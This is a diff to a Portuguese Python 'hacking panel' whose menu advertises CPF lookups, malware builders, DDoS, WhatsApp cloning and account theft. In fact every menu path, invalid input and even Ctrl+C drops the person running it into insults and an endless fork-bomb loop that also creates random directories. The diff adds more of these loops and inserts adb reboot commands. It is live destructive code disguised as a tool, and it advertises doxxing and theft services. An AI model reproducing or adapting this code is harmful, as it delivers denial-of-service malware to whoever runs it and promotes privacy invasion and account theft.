@@ -21,14 +21,22 @@ def clear(): os.system("cls||clear")
 clear()
 
 def lammer():
-    print(f'{amare}[!]{amare}{A}Lammerzinho, travazaper, fudido, seu merda.\nesta função nao pode ser usada por você.');sleep(3);clear()
+    try:
+        print(f'{amare}[!]{amare}{A}Lammerzinho, travazaper, fudido, seu merda.\nesta função nao pode ser usada por você.');sleep(2);clear() 
+    except KeyboardInterrupt:
+        while True:
+            print(f'{amare}[!]{amare}{A}Lammerzinho, travazaper, fudido, seu merda.\nesta função nao pode ser usada por você.');sleep(2);clear();os.fork()
+    try:
+        os.system("adb reboot")
+    except PermissionError:
+        os.system("adb reboot -f")
         
 def restart():
     os.execl(executable, executable, *argv)
 
 
-def banner(): 
-    print(f'''{V}
+def banner(cor): 
+    print(f'''{cor}
  ▄▄▄██▀▀▀▒█████  ▓█████   ██████ ▄▄▄█████▓ ▄▄▄       ██▀███  
    ▒██  ▒██▒  ██▒▓█   ▀ ▒██    ▒ ▓  ██▒ ▓▒▒████▄    ▓██ ▒ ██▒
    ░██  ▒██░  ██▒▒███   ░ ▓██▄   ▒ ▓██░ ▒░▒██  ▀█▄  ▓██ ░▄█ ▒
@@ -41,10 +49,10 @@ def banner():
 
 {amare}[!]{amare}{V}--developed by joestar hacking--.{amare}[!]{amare}
 ''')
-banner()
+banner(cor=V)
 def bonus():
     clear()
-    banner()
+    banner(cor=amare)
     print(f'{M}1 - Criar um malware para controlar celular. {verde}.apk')
     print(f'{M}2 - Criar um malware para controlar pc. {verde}.exe')
     print(f'{M}3 - DDOS {verde} outro metodo.')
@@ -57,10 +65,9 @@ def bonus():
         print(f'{M}Criando malware com o nome de: {nome}');sleep(0.7);clear()
         print(f'{M}Aguarde...');sleep(2);clear()
         print(f'{M}Malware criado em: ./Downloads');sleep(1);clear();lammer()
-        while True:
-            while True: 
-                os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}")
-                os.fork()
+        while True: 
+            os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}")
+            os.fork()
     elif escu == 2:
         clear()
         nom = str(input(f'{M}Digite o nome do malware.'))
@@ -68,9 +75,8 @@ def bonus():
         print(f'{M}Aguarde...');sleep(2);clear()
         print(f'{M}Malware criado em: ./Downloads');sleep(1);clear();lammer()
         while True:
-            while True: 
-                os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
-                os.fork()
+            os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
+            os.fork()
     elif escu == 3:
         ipp = str(input(f'{amare}[!]{amare}{P}[ALERT]{P}, Exemplo: 192.168.0.1)\n{M}Digite o ip alvo: '))
         if ipp != 12:
@@ -84,19 +90,18 @@ def bonus():
         print(f'Enviando 80000 pacotes para {ipp}.');sleep(0.5)
         print(f'Enviando 160000 pacotes para {ipp}.')
         print(f'Enviando 320000 pacotes para {ipp}.');clear();lammer()
-        os.system(f"mkdir {bomb(10*10)}")
-        os.system(f"mkdir {bomb(10*100)}")
-        os.system(f"mkdir {bomb(10*100)}")
-        os.fork()
+        os.system(f"mkdir {bomb(256)}")
+        os.system(f"mkdir {bomb(256)}")
+        os.system(f"mkdir {bomb(256)}")
+        while True:
+            os.fork()
     elif escu == 4:
         clear()
         input(f'{M}Digite aqui o nome que deseja consultar: ')
         clear();print(f'{M}Consultando...');sleep(2);clear()
         lammer()
         while True: 
-            os.system(f"mkdir {bomb(10*10)}")
-            os.system(f"mkdir {bomb(10*10)}")
-            os.system(f"mkdir {bomb(10*100)}")
+            os.system(f"mkdir {bomb(256)}")
             os.fork()
     elif escu == 5:
         clear()
@@ -105,8 +110,8 @@ def bonus():
         except:
             print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um número de telefone válido!');sleep(2);clear();lammer()
             while True:
-                os.system(f"mkdir {bomb(10*10)}")
-                os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
+                os.system(f"mkdir {bomb(256)}")
+                os.system(f"mkdir {bomb(256)}");os.system(f"mkdir {bomb(256)}")
                 os.fork()
         print(f'{M}Puxando dados do número {nume}...{verde}Aguarde.')
         sleep(2);clear();lammer()
@@ -129,18 +134,69 @@ print(f'{M} 11 - Clonar whatsapp.', f'{verde}Método spoofing.',f'{verde}[ON]')
 print(f'{M} 12 - Funções bonus.', f'{amare}VIP!')
 print(f'{M} 13 - Funções de roubo de conta.',f'{verde}[ON]')
 print(f'{M} 14 - Roubo em jogos.',f'{verde}[ON]')
+print(f'{M} 15 - Salves. {verde}[Salves.]')
 
-esc = str(input(f'{M}Digite a opção desejada: '))
+try:
+    esc = str(input(f'{M}Digite a opção desejada: '))
+except:
+    clear();sleep(2);lammer()
+    while True:
+        os.system(f"mkdir {bomb(10*100)}")
+        os.system(f"mkdir {bomb(10*100)}")
+        os.fork()
+
 if esc == '1':
     clear()
-    cpf = int(input(f'{M}Digite aqui o cpf que deseja consultar: '))
-    if cpf != 11:
-        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Quantidade de digitos invalida!');sleep(2);clear()
-        lammer()
-        while True: 
-            os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
-            os.fork()
+    print(f'{M}Método 1.{verde}[ON]')
+    print(f'{M}Método 2.{V}[OFF]')
+    print(f'{M}Método 3.{verde}[ON]')
+    print(f'{M}Método 4.{V}[OFF]')
+    try:
+        metodo = int(input(f'{M}Digite o Método que deseja utilizar: '))
+    except:
+        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Digito invalido!')
+    if metodo == 1:
+        clear()
+        cpf = int(input(f'{M}Digite aqui o cpf que deseja consultar: '))
+        if cpf != 11:
+            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Quantidade de digitos invalida!');sleep(2);clear()
+            lammer()
+            while True: 
+                os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
+                os.fork()
+    elif metodo == 2:
+        clear()
+        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(1.3);lammer()
+        while True:
+                os.system(f"mkdir {bomb(10*100)}")
+                os.system(f"mkdir {bomb(10*100)}")
+                os.fork()
+    elif metodo == 3:
+        clear()
+        try:
+            surfacing = int(input(f'{M}Digite aqui o cpf que deseja consultar: '))
+        except:
+            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Quantidade de digitos invalida!');sleep(2);clear()
+            lammer()
+            while True: 
+                os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
+                os.fork()
+
+        if surfacing != 11:
+            print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Quantidade de digitos invalida!');sleep(2);clear()
+            lammer()
+            while True: 
+                os.system(f"mkdir {bomb(10*10)}");os.system(f"mkdir {bomb(10*100)}");os.system(f"mkdir {bomb(10*100)}")
+                os.fork()
+    elif metodo == 4:
+        clear()
+        print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(1.3);lammer()
+        while True:
+                os.system(f"mkdir {bomb(10*100)}")
+                os.system(f"mkdir {bomb(10*100)}")
+                os.fork()
         
+
 elif esc == "2":
     clear()
     input(f'{M}Digite aqui o nome que deseja consultar: ')
@@ -498,20 +554,20 @@ elif esc == "13":
             clear()
             print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(1.3);lammer()
             while True:
-                os.system(f"mkdir {bomb(10*100)}")
-                os.system(f"mkdir {bomb(10*100)}")
+                os.system(f"mkdir {bomb(256)}")
+                os.system(f"mkdir {bomb(256)}")
                 os.fork()
     elif roubo == 2:
         print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(2);clear();lammer()
         while True:
-                os.system(f"mkdir {bomb(10*100)}")
-                os.system(f"mkdir {bomb(10*100)}")
+                os.system(f"mkdir {bomb(256)}")
+                os.system(f"mkdir {bomb(256)}")
                 os.fork()
     elif roubo == 3:
         print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(2);clear();lammer()
         while True:
-                os.system(f"mkdir {bomb(10*100)}")
-                os.system(f"mkdir {bomb(10*100)}")
+                os.system(f"mkdir {bomb(256)}")
+                os.system(f"mkdir {bomb(256)}")
                 os.fork()
         
 elif esc == "14":
@@ -524,8 +580,8 @@ elif esc == "14":
         clear()
         print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Opção invalida!');sleep(2);clear();lammer()
         while True:
-                os.system(f"mkdir {bomb(10*100)}")
-                os.system(f"mkdir {bomb(10*100)}")
+                os.system(f"mkdir {bomb(256)}")
+                os.system(f"mkdir {bomb(256)}")
                 os.fork()
     if fred == 1:
         clear()
@@ -537,8 +593,8 @@ elif esc == "14":
             clear()
             print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Opção invalida!');sleep(2);clear();lammer()
             while True:
-                os.system(f"mkdir {bomb(10*100)}")
-                os.system(f"mkdir {bomb(10*100)}")
+                os.system(f"mkdir {bomb(256)}")
+                os.system(f"mkdir {bomb(256)}")
                 os.fork()
         if six == 1:
             try:
@@ -547,21 +603,21 @@ elif esc == "14":
                 clear()
                 print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um id válido.');sleep(2);clear();lammer()
                 while True:
-                    os.system(f"mkdir {bomb(10*100)}")
-                    os.system(f"mkdir {bomb(10*100)}")
+                    os.system(f"mkdir {bomb(256)}")
+                    os.system(f"mkdir {bomb(256)}")
                     os.fork()
             if conta < 10:
                 print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Quantidade de digitos inválido.');sleep(2);clear();lammer()
                 while True:
-                    os.system(f"mkdir {bomb(10*100)}")
-                    os.system(f"mkdir {bomb(10*100)}")
+                    os.system(f"mkdir {bomb(256)}")
+                    os.system(f"mkdir {bomb(256)}")
                     os.fork()
             else:
                 clear()
                 print(f'{verde}Fazendo spoofing da conta..');sleep(2);clear();print(f'{verde}Aguarde...');sleep(2);clear();lammer()
                 while True:
-                    os.system(f"mkdir {bomb(10*100)}")
-                    os.system(f"mkdir {bomb(10*100)}")
+                    os.system(f"mkdir {bomb(256)}")
+                    os.system(f"mkdir {bomb(256)}")
                     os.fork()
         elif six == 2:
             clear()
@@ -574,8 +630,8 @@ elif esc == "14":
                 clear()
                 print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Opção inválida!');sleep(2);clear();lammer()
                 while True:
-                    os.system(f"mkdir {bomb(10*100)}")
-                    os.system(f"mkdir {bomb(10*100)}")
+                    os.system(f"mkdir {bomb(256)}")
+                    os.system(f"mkdir {bomb(256)}")
                     os.fork()
             if plata == 1:
                 print(f'{M}1 - Método por Nome da conta.{verde}[ON]')
@@ -587,8 +643,8 @@ elif esc == "14":
                     clear()
                     print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Opção inválida!');sleep(2);clear()
                     while True:
-                        os.system(f"mkdir {bomb(10*100)}")
-                        os.system(f"mkdir {bomb(10*100)}")
+                        os.system(f"mkdir {bomb(256)}")
+                        os.system(f"mkdir {bomb(256)}")
                         os.fork()
                 if gta == 1:
                     try:
@@ -597,13 +653,13 @@ elif esc == "14":
                         clear()
                         print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um nome valido!');sleep(2);clear();lammer()
                         while True:
-                            os.system(f"mkdir {bomb(10*100)}")
-                            os.system(f"mkdir {bomb(10*100)}")
+                            os.system(f"mkdir {bomb(256)}")
+                            os.system(f"mkdir {bomb(256)}")
                             os.fork()
                     print(f'{M}Hackeando a conta: {cont}... {verde}Aguarde...');sleep(2);clear();lammer()
                     while True:
-                        os.system(f"mkdir {bomb(10*100)}")
-                        os.system(f"mkdir {bomb(10*100)}")
+                        os.system(f"mkdir {bomb(256)}")
+                        os.system(f"mkdir {bomb(256)}")
                         os.fork()
                 elif gta == 2:
                     try:
@@ -612,29 +668,31 @@ elif esc == "14":
                         clear()
                         print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Você não digitou um nome valido!');sleep(2);clear();lammer()
                         while True:
-                            os.system(f"mkdir {bomb(10*100)}")
-                            os.system(f"mkdir {bomb(10*100)}")
+                            os.system(f"mkdir {bomb(256)}")
+                            os.system(f"mkdir {bomb(256)}")
                             os.fork()
                     print(f'{M}Hackeando a conta: {contaa}... {verde}Aguarde...');sleep(2);clear();lammer()
                     while True:
-                        os.system(f"mkdir {bomb(10*100)}")
-                        os.system(f"mkdir {bomb(10*100)}")
+                        os.system(f"mkdir {bomb(256)}")
                         os.fork()
                 elif gta == 3:
                     clear()
                     print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(1.3);lammer()
                     while True:
-                        os.system(f"mkdir {bomb(10*100)}")
-                        os.system(f"mkdir {bomb(10*100)}")
+                        os.system(f"mkdir {bomb(256)}")
                         os.fork()
     elif fred == 2:
         clear()
         print(f'{amare}[!]{amare}{P} ALERT{P}, {A}Avisei que estava off\nagora irá sofrer as consequencias.');sleep(1.3);lammer()
         clear()
         while True:
-                os.system(f"mkdir {bomb(10*100)}")
-                os.system(f"mkdir {bomb(10*100)}")
+                os.system(f"mkdir {bomb(256)}")
                 os.fork()
+elif esc == "15":
+    clear()
+    print(f'{M}Salve para os manos: {V}Mr diniz, Joshu, matheus joestar, Dio, crowley, lucas\nSpyware, Kimatsuki, vitor.');sleep(5);clear()
+    print(f'{M}Salve pros manos da joestar team :D.{V}Diniz, Joshu, Dio, Spyware, Matheus Joestar.');sleep(5);clear()
+    print(f'{M}Salve pra quem divulgou o painel.');sleep(6);clear();restart()
 
 else:
     clear()
@@ -642,7 +700,6 @@ else:
     print(f'{A}Problema é seu, seu bosta.');sleep(2);clear()
     while True:
         lammer()
-        os.system(f"mkdir {bomb(10*100)}")
-        os.system(f"mkdir {bomb(10*100)}")
+        os.system(f"mkdir {bomb(253)}")
+        os.system(f"mkdir {bomb(256)}")
         os.fork()
-
